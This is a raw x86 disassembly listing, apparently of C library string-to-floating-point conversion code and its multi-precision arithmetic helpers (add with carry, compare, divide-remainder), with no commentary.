mov eax, dword [var_1068h]
mov dword [var_1068h], edi
mov dword [var_1064h], eax
jmp 0x808b1c4
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b1c4
mov ecx, dword [var_110ch]
lea eax, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_110ch]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b1c4
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
jmp 0x808b0e7
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
cmp dword [var_110ch], 0x1f
jle 0x808b3aa
mov ebx, dword [var_110ch]
mov ecx, dword [var_110ch]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_110ch], 0xffffffff
cmovg ebx, dword [var_110ch]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_1068h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x808b03b
lea edx, [ebp + eax*4 - 0x1068]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x808b399
jmp 0x808b03b
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b03b
mov edx, dword [var_110ch]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x808b03b
test eax, eax
mov ecx, eax
jle 0x808b403
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b3e7
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b420
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b410
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
sub dword [var_106ch], edx
jmp 0x808b04e
test eax, eax
mov edx, eax
jle 0x808b04e
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b442
jmp 0x808b04e
cmp dword [var_1070h], 1
mov eax, dword [var_1048h]
mov dword [var_1100h], 0
mov dword [var_1104h], 0
mov edi, dword [var_104ch]
mov dword [var_10fch], eax
jle 0x808b6aa
mov esi, dword [var_828h]
mov ebx, dword [var_82ch]
cmp dword [var_1080h], 0x40
jg 0x808b56e
cmp esi, dword [var_10fch]
je 0x808b676
mov eax, ebx
mov edx, esi
div dword [var_10fch]
mov ecx, edx
mov dword [var_1100h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x808b4d4
jne 0x808b4ed
test ebx, ebx
je 0x808b4ed
add ecx, dword [var_10fch]
dec dword [var_1100h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_10fch]
jae 0x808b4ca
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b5df
mov eax, dword [var_1100h]
mov edx, 0x20
test eax, eax
je 0x808b51e
bsr edx, dword [var_1100h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b5b9
mov eax, dword [ebp - 0x1100]
add edx, 0x40
mov dword [ebp - 0x1120], 0x61
sub ecx, edx
mov dword [ebp - 0x1104], edx
shr eax, cl
mov dword [ebp - 0x1068], eax
mov eax, dword [ebp - 0x1120]
cmp eax, 0x40
mov dword [ebp - 0x1080], eax
jle 0x808b4a6
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b582
test esi, esi
jne 0x808b582
test ebx, ebx
je 0x808b587
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1100h]
mov eax, 0x1f
sub eax, dword [var_1104h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_8h], ecx
jmp 0x808ac60
mov ecx, dword [ebp - 0x1100]
neg edx
mov dword [ebp - 0x1064], 0
add edx, 0x20
mov dword [ebp - 0x1120], edx
mov dword [ebp - 0x1068], ecx
jmp 0x808b559
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b610
mov eax, dword [var_1068h]
mov edx, dword [var_1100h]
mov dword [var_1064h], eax
mov dword [var_1068h], edx
jmp 0x808b559
mov dword [var_1104h], 0x40
mov ecx, dword [var_1080h]
sub dword [var_1104h], ecx
mov eax, dword [var_1104h]
test eax, eax
jle 0x808b559
mov eax, dword [ebp - 0x1104]
lea edx, [ebp - 0x1068]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1100]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1104]
shr eax, cl
or dword [ebp - 0x1068], eax
jmp 0x808b559
lea ecx, [esi + ebx]
mov dword [var_1100h], 0xffffffff
cmp ecx, esi
jb 0x808b69a
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808b4ca
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808b4f7
mov eax, dword [var_82ch]
cmp eax, dword [var_10fch]
jb 0x808b6c1
xor esi, esi
mov ebx, eax
jmp 0x808b499
mov ecx, dword [var_1080h]
test ecx, ecx
jle 0x808b74a
mov ebx, dword [var_1080h]
add ebx, 0x20
cmp ebx, 0x40
jg 0x808b704
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
mov dword [var_1080h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808b499
mov dword [var_1104h], 0x40
mov edx, dword [var_1080h]
sub dword [var_1104h], edx
mov edx, dword [var_1104h]
test edx, edx
jle 0x808b6f5
mov ecx, dword [var_1104h]
lea esi, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x808b6ef
mov ebx, dword [var_1080h]
sub ebx, 0x20
mov dword [var_106ch], ebx
jmp 0x808b6fb
mov dword [var_10f8h], 0
mov ebx, dword [var_82ch]
mov edi, dword [var_104ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b826
test esi, esi
mov edx, 0x20
je 0x808b798
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b809
add edx, 0x40
mov eax, esi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_10f8h], edx
shr eax, cl
mov dword [var_1068h], eax
mov edx, dword [var_1120h]
cmp edx, 0x40
mov dword [var_1080h], edx
jle 0x808b771
mov edi, dword [var_10e8h]
xor eax, eax
test edi, edi
jne 0x808b7ec
test ebx, ebx
je 0x808b7f1
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_10f8h]
jmp 0x808b5a0
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], esi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b7cb
mov ecx, dword [var_1080h]
add ecx, 0x20
cmp ecx, 0x40
mov dword [var_1120h], ecx
jg 0x808b851
mov eax, dword [var_1068h]
mov dword [var_1068h], esi
mov dword [var_1064h], eax
jmp 0x808b7cb
mov dword [var_10f8h], 0x40
mov eax, dword [var_1080h]
sub dword [var_10f8h], eax
mov eax, dword [var_10f8h]
test eax, eax
jle 0x808b7cb
mov edx, dword [var_10f8h]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_10f8h]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b7cb
mov ecx, dword [var_107ch]
lea edi, [var_104ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ae40
mov edx, dword [var_10f4h]
mov ecx, dword [var_107ch]
mov esi, dword [var_10ech]
mov dword [var_10h], ecx
mov ecx, dword [var_10f0h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_10ech]
mov esi, dword [var_10f4h]
mov edx, dword [var_107ch]
add edx, dword [esi + 4]
mov esi, dword [var_10f0h]
mov dword [var_10f0h], edi
mov dword [var_10ech], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_107ch], edx
jmp 0x808ae1b
mov dword [ebp + eax*4 - 0x1068], 0
jmp 0x808ad3c
mov eax, dword [var_1080h]
mov edx, dword [var_1080h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_10e0h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x1f
je 0x808ba80
cmp edx, 0x1e
jg 0x808ba1a
mov ecx, dword [var_10cch]
mov eax, 0x1f
mov ebx, 2
sub eax, edx
lea esi, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808b9d4
mov ecx, dword [var_1074h]
mov esi, dword [var_10e0h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_1068h]
mov dword [esp], eax
jmp 0x808ac6e
lea eax, [edx - 0x1f]
lea edi, [var_1068h]
lea edx, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_10cch]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_10cch]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_1070h]
test edx, edx
mov dword [ebp + edx*4 - 0x1068], eax
jle 0x808b9e0
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x808ba6f
jmp 0x808b9e0
mov eax, 2
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
mov edi, eax
sub edi, dword [var_10cch]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x1068]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808babd
jmp 0x808b9e0
mov ecx, dword [var_1070h]
lea edi, [var_82ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ab49
mov dword [var_10h], edx
mov ecx, dword [var_10c0h]
mov dword [var_8h], esi
mov edx, dword [var_10c8h]
mov dword [var_ch], ecx
mov ecx, dword [var_10c4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x808aae4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6a2
mov ecx, dword [var_1094h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x808a9ca
mov eax, ecx
jmp 0x808a9ca
mov eax, dword [var_1084h]
mov ecx, dword [arg_14h]
mov dword [var_10bch], 1
mov esi, 0x1f
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bb83
inc dword [var_1084h]
mov eax, dword [var_1084h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808bb6a
cmp dl, 0x30
je 0x808bd41
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd2a
inc dword [var_1084h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6200]
dec dword [var_1090h]
mov dword [var_1080h], eax
mov eax, esi
sub eax, dword [var_1080h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_1080h]
mov dword [var_1064h], edx
mov edx, dword [var_1094h]
lea eax, [ecx + edx*4]
add eax, dword [var_106ch]
lea ebx, [eax - 5]
mov eax, dword [var_1090h]
mov dword [var_106ch], ebx
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
lea ebx, [ebp + eax*4 - 0x1068]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bc24
mov eax, dword [var_10a8h]
add ecx, eax
mov dword [var_1084h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd13
inc dword [var_1084h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808bcba
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_1090h]
mov eax, dword [var_1090h]
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
test eax, eax
jns 0x808bc00
mov ebx, dword [var_10bch]
test ebx, ebx
jle 0x808bc89
lea edx, [var_1068h]
mov eax, dword [var_10bch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808bc7d
mov esi, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x808ba0c
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_10bch]
js 0x808bce2
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808bc4d
xor eax, eax
mov ecx, dword [var_1074h]
mov dword [var_10h], 0x1f
cmp dword [var_1090h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_106ch]
jmp 0x808ac61
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bc3b
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bba3
inc dword [var_1084h]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808bd41
jmp 0x808bb8c
mov eax, dword [var_1098h]
mov edx, dword [var_106ch]
shl eax, 2
sub edx, eax
jmp 0x808a98a
test al, al
jne 0x808a922
jmp 0x808a95f
lea esi, [esi]
mov ecx, dword [var_109ch]
movzx eax, byte [ecx + 1]
jmp 0x808bd70
mov edx, dword [arg_ch]
test edx, edx
jne 0x808a69d
jmp 0x808a6a2
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x808a6a2
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x808a6a2
mov eax, dword [var_109ch]
movzx eax, byte [eax]
mov byte [var_1112h], al
mov edx, dword [var_1090h]
xor eax, eax
test edx, edx
mov dword [var_1094h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_1112h], 0
mov dword [var_1098h], eax
je 0x808c147
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808be09
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808bdf5
test al, al
jne 0x808c140
add edi, dword [var_10a8h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0fd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x808be52
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp dword [var_1098h], 0xffffffff
cmovne eax, dword [var_1098h]
mov dword [var_1098h], eax
inc dword [var_1090h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808be2b
cmp dword [var_1078h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808be7e
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
cmp dword [var_1078h], 0x10
mov dword [var_108ch], edi
je 0x808c0f4
cmp dword [ecx + eax*4], 0x65
je 0x808bf81
mov esi, dword [var_1094h]
cmp dword [var_1090h], esi
jle 0x808beb9
mov eax, dword [var_108ch]
cmp byte [eax - 1], 0x30
je 0x808bf64
mov ecx, dword [var_1094h]
cmp dword [var_1090h], ecx
jne 0x808a8bb
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808a8bb
mov ebx, dword [var_106ch]
test ebx, ebx
jns 0x808a8bb
cmp dword [var_1078h], 0x10
je 0x808bf48
mov eax, dword [var_108ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x808bf40
cmp cl, 0x30
jne 0x808a8bb
dec dword [var_1090h]
inc ebx
dec dword [var_108ch]
mov ecx, dword [var_1090h]
dec dword [var_1094h]
mov dword [var_106ch], ebx
test ecx, ecx
jle 0x808a8bb
test ebx, ebx
js 0x808bee7
jmp 0x808a8bb
mov esi, esi
dec dword [var_108ch]
jmp 0x808bee7
mov esi, dword [var_108ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x808bf05
jmp 0x808bf40
dec dword [var_108ch]
dec dword [var_1090h]
mov edx, dword [var_108ch]
cmp byte [edx - 1], 0x30
je 0x808bf64
jmp 0x808beb9
inc edi
mov dword [var_10b8h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x808c0e8
cmp al, 0x2b
je 0x808c0df
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0d4
cmp dword [var_1078h], 0x10
je 0x808c0a1
mov eax, dword [var_10b8h]
test eax, eax
je 0x808c08a
mov edx, dword [var_1094h]
add edx, 0x1383
mov eax, dword [var_106ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_106ch], ebx
jg 0x808c01e
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_106ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808bfd3
mov esi, dword [var_10b8h]
test esi, esi
je 0x808be9b
neg ebx
mov dword [var_106ch], ebx
jmp 0x808be9b
cmp dword [var_1098h], 0xffffffff
je 0x808c078
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_10b8h]
test eax, eax
jne 0x808c074
mov eax, dword [var_1074h]
test eax, eax
je 0x808c06c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x808c04c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808c04c
fldz
jmp 0x808c04c
mov eax, dword [var_1074h]
test eax, eax
je 0x808c074
fld dword [0x80a6104]
jmp 0x808c04c
mov eax, dword [var_1098h]
sub eax, dword [var_1094h]
lea edx, [eax + 0x1344]
jmp 0x808bfd3
mov eax, dword [var_10b8h]
mov ecx, dword [var_1094h]
test eax, eax
lea edx, [ecx*4 + 0x403d]
jne 0x808bfd3
mov edx, dword [var_1098h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x4000]
jmp 0x808bfd3
mov edi, dword [var_108ch]
jmp 0x808be9b
inc edi
movzx esi, byte [edi]
jmp 0x808bfa1
mov dword [var_10b8h], 1
jmp 0x808c0df
cmp dword [ecx + eax*4], 0x70
jmp 0x808be95
cmp dword [var_1078h], 0x10
je 0x808c116
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808be7e
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
jmp 0x808be7e
nop
lea esi, [esi]
mov edx, esi
movsx eax, dl
jmp 0x808c10b
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
jmp 0x808be09
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a806
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x808a7cb
cmp eax, 0x66
ja 0x808a7cb
inc dword [var_1090h]
jmp 0x808a800
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x808c1aa
cmp dl, byte [ecx + 0x198]
jle 0x808a7a3
xor ebx, ebx
cmp byte [var_1111h], 0
je 0x808a7a3
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808a7a3
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808c1c2
jmp 0x808a7a3
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a78b
mov ecx, esi
cmp cl, 0x30
jne 0x808a78f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x808c1f8
jmp 0x808a78f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808a731
add edi, 2
mov dword [var_1078h], 0x10
movzx esi, byte [edi]
mov dword [var_10a4h], 0
jmp 0x808a731
lea esi, [esi]
test al, al
jne 0x808a54d
jmp 0x808a53d
mov edx, dword [var_109ch]
movzx eax, byte [edx]
jmp 0x808c240
inc edi
movzx esi, byte [edi]
jmp 0x808a504
mov dword [var_1074h], 1
jmp 0x808c258
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808c2d8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808c2d5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
adc eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
adc eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
adc eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
adc eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
adc eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
adc eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
adc eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
adc eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808c2d8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
dec edx
js 0x808c34b
mov eax, dword [ecx + edx*4]
cmp dword [ebx + edx*4], eax
jne 0x808c350
dec edx
jns 0x808c340
xor eax, eax
pop ebx
leave
ret
seta al
movzx eax, al
lea eax, [eax + eax - 1]
jmp 0x808c34d
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
cmp dword [arg_1ch], 1
mov dword [var_10h], 0
mov esi, dword [arg_14h]
je 0x808c67e
jle 0x808c665
cmp dword [arg_1ch], 2
je 0x808c55b
mov eax, esi
mov ebx, dword [arg_10h]
mov edi, dword [arg_1ch]
sub eax, dword [arg_1ch]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_1ch]
lea ebx, [ebx + eax*4]
mov eax, dword [arg_18h]
mov dword [arg_10h], ebx
mov edi, dword [eax + edi*4 - 4]
mov edx, dword [eax + edx*4 - 8]
mov dword [var_2ch], edi
mov dword [var_20h], edx
mov edi, ebx
mov ebx, dword [ebx + ecx*4 - 4]
cmp ebx, dword [var_2ch]
jb 0x808c42a
ja 0x808c3fc
mov eax, ecx
mov dword [esp], edi
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [var_4h], eax
call fcn.0808c330
test eax, eax
js 0x808c42a
mov ebx, dword [arg_10h]
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808d570
mov dword [var_10h], 1
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
mov ebx, dword [eax + edi*4 - 4]
mov eax, dword [arg_ch]
add eax, esi
sub eax, dword [arg_1ch]
dec eax
mov dword [var_1ch], eax
js 0x808c50a
lea esi, [esi]
mov edx, dword [arg_ch]
cmp dword [var_1ch], edx
jl 0x808c529
sub dword [arg_10h], 4
mov ecx, dword [arg_1ch]
mov esi, dword [arg_10h]
mov ecx, dword [esi + ecx*4]
mov dword [var_24h], ecx
cmp ebx, dword [var_2ch]
mov esi, 0xffffffff
je 0x808c4b0
mov edx, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov eax, dword [ecx + edx*4 - 4]
mov edx, ebx
div dword [var_2ch]
mov ecx, edx
mov esi, eax
mov eax, dword [var_20h]
mul esi
cmp edx, ecx
mov ebx, eax
jbe 0x808c515
add ecx, dword [var_2ch]
dec esi
cmp ecx, dword [var_2ch]
jb 0x808c4b0
cmp ebx, dword [var_20h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_20h]
cmp edx, ecx
ja 0x808c488
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
nop
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
mov ebx, dword [arg_10h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.0808d600
cmp dword [var_24h], eax
je 0x808c4ed
mov edi, dword [arg_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
dec esi
mov dword [var_ch], edi
mov dword [var_8h], eax
call fcn.0808c2a0
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov edi, dword [arg_10h]
mov dword [ecx + edx*4], esi
dec edx
mov esi, dword [arg_1ch]
mov dword [var_1ch], edx
mov ebx, dword [edi + esi*4 - 4]
jns 0x808c440
mov eax, dword [var_10h]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
jmp 0x808c4b0
mov esi, dword [arg_1ch]
mov edi, dword [arg_10h]
mov edx, dword [arg_1ch]
mov esi, dword [edi + esi*4 - 4]
dec edx
mov dword [var_24h], esi
js 0x808c54d
lea esi, [esi]
mov edi, dword [arg_10h]
mov eax, dword [edi + edx*4]
mov dword [edi + edx*4 + 4], eax
dec edx
jns 0x808c540
mov eax, dword [arg_10h]
mov dword [eax], 0
jmp 0x808c45c
mov edi, dword [arg_10h]
mov ecx, dword [arg_18h]
mov ebx, dword [arg_18h]
lea eax, [edi + esi*4]
mov ecx, dword [ecx + 4]
lea edx, [eax - 8]
mov ebx, dword [ebx]
mov eax, dword [eax - 8]
mov dword [arg_10h], edx
mov edx, dword [edx + 4]
mov dword [var_18h], ecx
mov dword [var_30h], ebx
cmp edx, ecx
jb 0x808c595
ja 0x808c588
cmp eax, ebx
jb 0x808c595
mov dword [var_10h], 1
sub eax, dword [var_30h]
sbb edx, dword [var_18h]
mov ecx, dword [arg_ch]
lea esi, [esi + ecx - 3]
